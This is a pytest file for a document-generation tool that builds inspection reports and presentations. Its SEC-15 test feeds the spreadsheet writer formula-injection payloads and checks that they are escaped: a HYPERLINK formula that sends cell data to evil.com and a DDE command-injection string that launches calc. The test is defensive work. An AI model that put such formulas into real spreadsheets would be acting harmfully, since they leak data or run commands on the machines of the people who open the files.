"""Unit tests for deliverable document generators (tools/documents.py).

Verifies DOCX, XLSX, PPTX, and calculation report creation,
including SEC-15 formula sanitization and placeholder substitution.
"""

from pathlib import Path
import pytest
import docx
import openpyxl
import pptx

from backend.core.config import get_settings
from backend.core.db import Artifact, Task, User, get_session_factory
from backend.core.security import hash_password
from tools.documents import (
    CalculationEntry,
    CreateCalculationReportArgs,
    CreateDocxArgs,
    CreatePptxArgs,
    CreateXlsxArgs,
    create_calculation_report,
    create_docx,
    create_pptx,
    create_xlsx,
)
from tools.registry import ToolContext


@pytest.fixture
def test_user_and_task(tmp_path):
    """Seed test user and task in SQLite database."""
    import uuid
    uid = uuid.uuid4().hex[:8]
    factory = get_session_factory()
    with factory() as db:
        user = User(
            id=f"user_{uid}",
            username=f"doc_eng_{uid}",
            password_hash=hash_password("Pass123!"),
            role="engineer",
            clearance=2,
            active=True,
        )
        db.add(user)
        db.commit()
        task = Task(
            id=f"task_{uid}",
            owner_id=user.id,
            request_text="Generate inspection deliverables",
            task_type="inspection_report",
            selected_models_json='["qwen3.5:4b"]',
            status="running",
        )
        db.add(task)
        db.commit()
        return user.id, task.id


def test_create_docx_approval_note(test_user_and_task):
    user_id, task_id = test_user_and_task
    ctx = ToolContext(user_id=user_id, role="engineer", clearance="INTERNAL", run_id=task_id)

    fields = {
        "title": "Pressure Vessel Inspection Approval Note",
        "doc_id": "APPR-2026-PV-001",
        "date": "2026-09-23",
        "run_id": task_id,
        "prepared_by": "Senior Inspection Engineer",
        "asset_id": "PV-401A",
        "inspection_date": "2026-09-20",
        "inspector": "Field Inspector T. Ray",
        "findings": [
            {
                "finding": "Localized pitting detected on lower weld seam.",
                "source": "page_3_scan_1",
                "severity": "Moderate",
            },
            {
                "finding": "Flange face shows minor oxidation within allowable limits.",
                "source": "page_5_ocr",
                "severity": "Low",
            },
        ],
        "visual_observations": [
            {
                "component": "Lower Weld Seam",
                "visible_condition": "Surface irregularity visible",
                "source": "page_3_image_1",
                "type": "observed",
                "limitation": "Visual observation only; not a certified dimensional measurement",
            }
        ],
        "sop_references": [
            {
                "standard": "SOP-PV-004",
                "section": "Section 4.2 Weld Integrity",
                "clause": "Acceptance criteria for surface pitting",
            }
        ],
        "calculations": [
            {
                "parameter": "Remaining Wall Margin",
                "formula": "measured_wall - min_wall",
                "result": "2.5 mm",
                "status": "PASS",
            }
        ],
        "recommendations": [
            {
                "recommendation": "Perform ultrasonic thickness gauging at 6-month interval.",
                "rationale": "Monitor pitting progression per SOP-PV-004.",
            }
        ],
        "actions": "1. Schedule UT inspection in Q1.\n2. Apply protective sealant.",
    }

    args = CreateDocxArgs(
        template_path="templates/approval_note.docx",
        fields=fields,
        filename="Test_Approval_Note.docx",
    )

    result = create_docx(args, ctx)

    out_path = Path(result.path)
    assert out_path.exists()
    assert out_path.stat().st_size > 0
    assert len(result.sha256) == 64
    assert result.artifact_id is not None

    # Inspect with python-docx (paragraphs + tables)
    doc = docx.Document(out_path)
    all_texts = [p.text for p in doc.paragraphs]
    for table in doc.tables:
        for row in table.rows:
            for cell in row.cells:
                all_texts.append(cell.text)
    full_text = "\n".join(all_texts)
    assert "Pressure Vessel Inspection Approval Note" in full_text
    assert "PV-401A" in full_text
    assert "AI-ASSISTED DRAFT" in full_text
    assert "Human Review & Sign-Off Gate" in full_text
    assert "Review Decision" in full_text


def test_create_xlsx_with_sec15_sanitization(test_user_and_task):
    user_id, task_id = test_user_and_task
    ctx = ToolContext(user_id=user_id, role="engineer", clearance="INTERNAL", run_id=task_id)

    sheets = {
        "Data": [
            ["ID", "Description", "Untrusted Input", "Amount"],
            ["1", "Normal Item", "Clean text", 100],
            # SEC-15: Malicious formulas / untrusted strings injected
            ["2", "Malicious Hyperlink", "=HYPERLINK('http://evil.com/exfil?v='&A1, 'Click Me')", 200],
            ["3", "DDE Command Injection", "=cmd|'/C calc'!A0", 300],
            ["4", "At-Sign Injection", "@SUM(1, 2)", 400],
            ["5", "Plus-Sign Injection", "+1000", 500],
        ],
        "Calculations": [
            ["Metric", "Formula", "Result"],
            ["Total Amount", "=SUM(Data!D2:D6)", 1500],
        ],
        "Summary": [
            ["Key", "Value"],
            ["Total Records", 5],
            ["Status", "Complete"],
        ],
        "Sources": [
            ["Document", "Page", "Section"],
            ["Inspection_Log.pdf", "Page 2", "Table 1"],
        ],
    }

    args = CreateXlsxArgs(
        sheets=sheets,
        filename="Test_Analysis.xlsx",
    )

    result = create_xlsx(args, ctx)

    out_path = Path(result.path)
    assert out_path.exists()
    assert result.sanitized_cells_count > 0

    # Verify workbook structure and formula sanitization
    wb = openpyxl.load_workbook(out_path, data_only=False)
    assert set(wb.sheetnames) == {"Data", "Calculations", "Summary", "Sources"}

    data_sheet = wb["Data"]
    # Check that untrusted strings in Data are stored safely with leading single quote or not executed
    cell_c3 = data_sheet["C3"].value
    cell_c4 = data_sheet["C4"].value
    cell_c5 = data_sheet["C5"].value

    # Must be escaped with ' to neutralize formula execution in Excel
    assert cell_c3.startswith("'=") or data_sheet["C3"].data_type == "s"
    assert cell_c4.startswith("'=") or data_sheet["C4"].data_type == "s"
    assert cell_c5.startswith("'@") or data_sheet["C5"].data_type == "s"

    calc_sheet = wb["Calculations"]
    calc_formula = calc_sheet["B2"].value
    # Intentional formula created by code is preserved
    assert calc_formula == "=SUM(Data!D2:D6)"


def test_create_pptx_slides(test_user_and_task):
    user_id, task_id = test_user_and_task
    ctx = ToolContext(user_id=user_id, role="engineer", clearance="INTERNAL", run_id=task_id)

    fields = {
        "title": "Inspection Executive Summary",
        "subtitle": "Confidential Technical Review",
        "agenda": "1. Executive Summary\n2. Findings\n3. Recommendations",
        "content_bullets": "• Asset: PV-401A\n• Integrity Status: Satisfactory with Monitoring\n• Recommendation: Re-inspect in 6 months",
        "sources": "• Inspection Report: DocRef-2026-IR-01 (Pages 1-5)\n• SOP: Standard Operating Procedure SOP-PV-004",
    }

    args = CreatePptxArgs(
        template_path="templates/presentation.pptx",
        fields=fields,
        filename="Test_Inspection_Briefing.pptx",
    )

    result = create_pptx(args, ctx)

    out_path = Path(result.path)
    assert out_path.exists()
    assert result.slides_count >= 4

    prs = pptx.Presentation(out_path)
    assert len(prs.slides) >= 4


def test_create_calculation_report(test_user_and_task):
    user_id, task_id = test_user_and_task
    ctx = ToolContext(user_id=user_id, role="engineer", clearance="INTERNAL", run_id=task_id)

    calculations = [
        CalculationEntry(
            name="Wall Thickness Remaining Life",
            formula="(measured_thickness - min_thickness) / corrosion_rate",
            inputs={
                "measured_thickness": 8.5,
                "min_thickness": 6.0,
                "corrosion_rate": 0.25,
            },
            result=10.0,
            units="years",
            assumptions="Linear corrosion model per API 570",
        )
    ]

    args = CreateCalculationReportArgs(
        title="Wall Thickness Life Assessment",
        calculations=calculations,
        filename_base="PV401A_Calculation_Report",
    )

    result = create_calculation_report(args, ctx)

    docx_path = Path(result.docx_path)
    xlsx_path = Path(result.xlsx_path)

    assert docx_path.exists()
    assert xlsx_path.exists()
    assert docx_path.stat().st_size > 0
    assert xlsx_path.stat().st_size > 0

    # Verify DOCX content (paragraphs + tables)
    doc = docx.Document(docx_path)
    all_texts = [p.text for p in doc.paragraphs]
    for table in doc.tables:
        for row in table.rows:
            for cell in row.cells:
                all_texts.append(cell.text)
    full_text = "\n".join(all_texts)
    assert "Wall Thickness Life Assessment" in full_text
    assert "Linear corrosion model" in full_text
    assert "10.0" in full_text

    # Verify XLSX content
    wb = openpyxl.load_workbook(xlsx_path, data_only=False)
    assert "Calculations" in wb.sheetnames
    assert "Summary" in wb.sheetnames
